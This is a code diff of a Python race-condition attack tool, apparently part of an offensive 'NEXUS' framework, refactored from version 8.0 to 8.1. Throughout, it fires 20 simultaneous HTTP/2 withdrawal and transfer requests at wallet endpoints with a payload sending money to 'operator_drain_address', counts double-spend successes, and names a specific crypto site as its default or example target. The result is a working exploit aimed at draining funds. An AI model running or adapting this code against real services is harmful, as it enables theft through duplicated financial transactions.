@@ -1,15 +1,32 @@
 #!/usr/bin/env python3
 """
-RACE_CONDITION.PY v8.0 — HTTP/2 Single-Packet Concurrency Engine (Elite Edition)
+RACE_CONDITION.PY — HTTP/2 Single-Packet Concurrency Engine (Elite Edition)
+Version: 8.1 — Offensive Red Team Concurrency & Ledger Double-Spend Auditor
+
 Features:
 - True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread)
 - Shared persistent session pool integration (cookies, CSRF headers, session tokens)
 - Automated transaction replay & financial ledger double-spend auditing
 - Strict response body inspection (filters out soft-404s and HTML error pages)
+- Immutable timestamped forensic evidence persistence (nexus_evidence/)
+
+Python 3.9+
 """
+
+from __future__ import annotations
+
 import asyncio
+import json
 import sys
+from pathlib import Path
+from datetime import datetime, timezone
 import httpx
+
+MODULE = "RACE_CONDITION"
+VERSION = "8.1"
+
+BASE_DIR = Path(__file__).resolve().parent.parent
+EVIDENCE_DIR = BASE_DIR / "nexus_evidence"
 
 COLORS = {
     "RED": "\033[91m",
@@ -21,10 +38,16 @@ COLORS = {
     "RESET": "\033[0m",
 }
 
+
+def timestamp():
+    return datetime.now(timezone.utc).isoformat()
+
+
 def log(msg, color="GREEN"):
     ansi_color = COLORS.get(color, color)
-    sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
+    sys.stdout.write(f"{ansi_color}[{MODULE}] {msg}{COLORS['RESET']}\n")
     sys.stdout.flush()
+
 
 async def fire_multiplexed_stream(client, url, headers, cookies, payload):
     """Fires an individual HTTP/2 stream request over the shared multiplexed connection."""
@@ -34,102 +57,155 @@ async def fire_multiplexed_stream(client, url, headers, cookies, payload):
     except Exception as exc:
         return {"status": 0, "body": str(exc), "headers": {}}
 
-async def run_race_condition_test(target_url, port=443, use_ssl=True, session_pool=None):
-    log("\n[***] INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT [***]", "MAGENTA")
 
-    # Target high-value financial ledger/withdrawal endpoints across projects
-    target_endpoints = [
-        "/api/v1/wallet/withdraw",
-        "/api/withdraw",
-        "/user/withdraw/confirm",
-        "/api/v1/transfer",
-        "/transfer"
-    ]
-    
-    base_url = target_url.rstrip("/")
+class RaceConditionAuditor:
 
-    cookies = dict(session_pool.cookie_jar) if session_pool and hasattr(session_pool, 'cookie_jar') else {}
-    default_headers = session_pool.default_headers if session_pool and hasattr(session_pool, 'default_headers') else {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Content-Type": "application/json",
-        "X-Requested-With": "XMLHttpRequest"
-    }
+    def __init__(self, target_url, port=443, use_ssl=True, session_pool=None):
+        self.raw_target = target_url
+        self.port = port
+        self.use_ssl = use_ssl
+        self.session_pool = session_pool
+        self.base_url = target_url.rstrip("/")
 
-    # Standard test payload for financial transfer/withdrawal assault
-    test_payload = {
-        "amount": 100.00,
-        "currency": "USD",
-        "destination": "operator_drain_address"
-    }
+        self.target_endpoints = [
+            "/api/v1/wallet/withdraw",
+            "/api/withdraw",
+            "/user/withdraw/confirm",
+            "/api/v1/transfer",
+            "/transfer"
+        ]
+        self.findings = []
 
-    log(f"[*] Establishing HTTP/2 multiplexed connection pool against {base_url}...", "CYAN")
+    async def run(self):
+        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT", "MAGENTA")
 
-    race_findings = []
+        cookies = dict(self.session_pool.cookie_jar) if self.session_pool and hasattr(self.session_pool, 'cookie_jar') else {}
+        default_headers = self.session_pool.default_headers if self.session_pool and hasattr(self.session_pool, 'default_headers') else {
+            "User-Agent": "NEXUS-OffensiveEngine/8.1",
+            "Content-Type": "application/json",
+            "X-Requested-With": "XMLHttpRequest"
+        }
 
-    # Use a single shared client with HTTP/2 enabled using correct async context syntax
-    async with httpx.AsyncClient(
-        base_url=base_url,
-        http2=True,
-        verify=False,
-        follow_redirects=True,
-        timeout=10.0
-    ) as client:
-        # Pre-warm the HTTP/2 connection to establish SETTINGS frames and stream window
-        try:
-            await client.get("/")
-        except Exception:
-            pass
+        test_payload = {
+            "amount": 100.00,
+            "currency": "USD",
+            "destination": "operator_drain_address"
+        }
 
-        for endpoint in target_endpoints:
-            full_url = f"{base_url}{endpoint}"
-            log(f"[*] Firing 20 single-packet concurrent streams against: {endpoint}", "CYAN")
+        log(f"Establishing HTTP/2 multiplexed connection pool against {self.base_url}...", "CYAN")
 
-            # Fire 20 concurrent HTTP/2 streams simultaneously within the same TCP window
-            tasks = [
-                fire_multiplexed_stream(client, endpoint, default_headers, cookies, test_payload)
-                for _ in range(20)
-            ]
-            
-            results = await asyncio.gather(*tasks)
+        async with httpx.AsyncClient(
+            base_url=self.base_url,
+            http2=True,
+            verify=False,
+            follow_redirects=True,
+            timeout=10.0
+        ) as client:
+            try:
+                await client.get("/")
+            except Exception:
+                pass
 
-            success_hits = 0
-            unique_responses = set()
+            for endpoint in self.target_endpoints:
+                log(f"Firing 20 single-packet concurrent streams against: {endpoint}", "CYAN")
 
-            for res in results:
-                status = res.get("status", 0)
-                body = res.get("body", "")
+                tasks = [
+                    fire_multiplexed_stream(client, endpoint, default_headers, cookies, test_payload)
+                    for _ in range(20)
+                ]
                 
-                # Filter out generic landing shells or 404/405 errors
-                is_valid_success = (
-                    status in [200, 201] and
-                    not "<div id=\"root\">" in body and
-                    not "404 Not Found" in body and
-                    any(k in body.lower() for k in ["success", "completed", "transaction", "balance", "transfer", "hash"])
-                )
+                results = await asyncio.gather(*tasks)
 
-                if is_valid_success:
-                    success_hits += 1
-                    unique_responses.add(body[:100]) # Store snippet to check for duplicate execution acceptance
+                success_hits = 0
+                unique_responses = set()
 
-            if success_hits > 1:
-                log(f"[!!!] RACE CONDITION VULNERABILITY CONFIRMED AT {endpoint}! Multiple success windows accepted: {success_hits}/20 [!!!]", "RED")
-                race_findings.append({
-                    "endpoint": endpoint,
-                    "successful_streams": success_hits,
-                    "total_fired": 20,
-                    "evidence": "Multiple state-changing responses accepted in single concurrency window"
-                })
-                break
-            else:
-                log(f"[-] Endpoint {endpoint} safely mitigated concurrency overlap (Success hits: {success_hits}/20)", "GRAY")
+                for res in results:
+                    status = res.get("status", 0)
+                    body = res.get("body", "")
+                    
+                    is_valid_success = (
+                        status in [200, 201] and
+                        "<div id=\"root\">" not in body and
+                        "404 Not Found" not in body and
+                        any(k in body.lower() for k in ["success", "completed", "transaction", "balance", "transfer", "hash"])
+                    )
 
-    if not race_findings:
-        log("[-] Race condition audit complete. Target successfully enforced transaction serialisation / nonce locking.", "YELLOW")
-    else:
-        log(f"[+] Confirmed {len(race_findings)} critical concurrency race conditions!", "GREEN")
+                    if is_valid_success:
+                        success_hits += 1
+                        unique_responses.add(body[:100])
 
-    return race_findings
+                if success_hits > 1:
+                    log(f"RACE CONDITION VULNERABILITY CONFIRMED AT {endpoint}! Multiple success windows accepted: {success_hits}/20", "RED")
+                    self.findings.append({
+                        "vector": "HTTP/2 Single-Packet Race Condition",
+                        "endpoint": endpoint,
+                        "successful_streams": success_hits,
+                        "total_fired": 20,
+                        "severity": "CRITICAL",
+                        "evidence": "Multiple state-changing responses accepted in single concurrency window",
+                        "timestamp": timestamp()
+                    })
+                    break
+                else:
+                    log(f"Endpoint {endpoint} safely mitigated concurrency overlap (Success hits: {success_hits}/20)", "GRAY")
+
+        if not self.findings:
+            log("Race condition audit complete. Target successfully enforced transaction serialisation / nonce locking.", "YELLOW")
+        else:
+            log(f"Confirmed {len(self.findings)} critical concurrency race conditions!", "GREEN")
+
+        return self.save_report()
+
+    def save_report(self):
+        EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
+        
+        report = {
+            "module": MODULE,
+            "version": VERSION,
+            "target": self.raw_target,
+            "generated_at": timestamp(),
+            "summary": {
+                "endpoints_tested": len(self.target_endpoints),
+                "confirmed_vulnerabilities": len(self.findings)
+            },
+            "findings": self.findings
+        }
+
+        filename = f"race_condition_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
+        output_path = EVIDENCE_DIR / filename
+        output_path.write_text(json.dumps(report, indent=4, ensure_ascii=False), encoding="utf-8")
+        
+        log(f"Forensic report saved to: {output_path}", "CYAN")
+        report["report_path"] = str(output_path)
+        return report
+
+
+# -------------------------------------------------------------
+# CENTRAL ENGINE ENTRY POINT
+# -------------------------------------------------------------
+
+async def run_race_condition_test(
+    cognitive_operator=None,
+    target_url=None,
+    port=443,
+    use_ssl=True,
+    session_pool=None,
+    **kwargs
+):
+    if target_url is None and isinstance(cognitive_operator, str):
+        target_url = cognitive_operator
+
+    if not target_url:
+        raise ValueError("target_url is required.")
+
+    auditor = RaceConditionAuditor(target_url, port=port, use_ssl=use_ssl, session_pool=session_pool)
+    return await auditor.run()
+
 
 if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
-    asyncio.run(run_race_condition_test(target))
+    import argparse
+    parser = argparse.ArgumentParser(description="NEXUS-36 HTTP/2 Race Condition Auditor")
+    parser.add_argument("target", help="Target URL (e.g. https://cryptobytes.online)")
+    args = parser.parse_args()
+
+    asyncio.run(run_race_condition_test(target_url=args.target))
